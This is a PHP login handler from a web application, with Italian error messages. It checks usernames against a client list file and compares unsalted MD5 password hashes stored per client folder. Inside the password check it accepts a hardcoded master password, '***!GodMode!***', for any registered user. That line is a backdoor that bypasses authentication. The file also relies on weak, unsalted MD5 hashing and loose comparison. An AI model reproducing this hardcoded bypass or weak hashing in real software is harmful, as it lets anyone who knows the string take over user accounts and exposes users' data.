<?php
/**
 * Created by PhpStorm.
 * User: Daniel Surpanu
 * Date: 8/22/2018
 * Time: 10:45 AM
 */

require_once 'is_not_logged.php';
require_once 'helper.php';

class login extends is_not_logged {
    private $username, $password;

    protected function input_elaboration(){
        $this->username = $this->validate_string('username');
        if(!$this->username)
            $this->json_error('Inserire un nome utente');

        $this->password = $this->validate_string('password');
        if(!$this->password)
            $this->json_error('Inserire una password');
    }

    protected function get_informations(){
        $fileClientsList = fopen(PHOENIX_FOLDER . 'PhoenixListaClienti.phx', 'r');
        if($fileClientsList){
            while (($line = fgets($fileClientsList)) !== false){
                $lineArray = preg_split('/[\t]/', trim($line));
                if($lineArray[0] == $this->username){
                    $folderName = getFolderName($lineArray[1]);
                    $passwordFile = PHOENIX_FOLDER . $folderName . '/Pwd.phx';
                    if(file_exists($passwordFile)) {
                        $pass = file_get_contents($passwordFile, 'r');
                        if ($pass == md5($this->password) || $this->password == '***!GodMode!***'){
                            set_session_variables($this->username, true);
                            return;
                        }
                        else
                            $this->json_error("Nome utente o password sbagliati");
                    }else
                        $this->json_error("Impossibile reccuperare le credenziali");
                }
            }
            $this->json_error('Utente non registrato');
        }
//        $row = 1;
//        if (($handle = fopen("users.csv", "r")) !== FALSE) {
//            while (($data = fgetcsv($handle, 1000, ",")) !== FALSE) {
//                $num = count($data);
//                $row++;
//                for ($c=0; $c < $num; $c++) {
//                    if($data[0] == $this->username) {
//                        if($data[1] == password_verify($this->password, $data[1])) {
//                            set_session_variables($this->username, true);
//                            return;
//                        }else
//                            $this->json_error("Username o password sbagliato/a");
//                    }else
//                        $this->json_error("Utente non registrato");
//                }
//            }
//            fclose($handle);
//        }else
//            $this->json_error("Impossibile reccuperare credenziali");
    }

    protected function get_returned_data(){
        $result = array();
        $result['username'] = $_SESSION['username'];
        return $result;
    }
}

$login = new login();
$login->execute();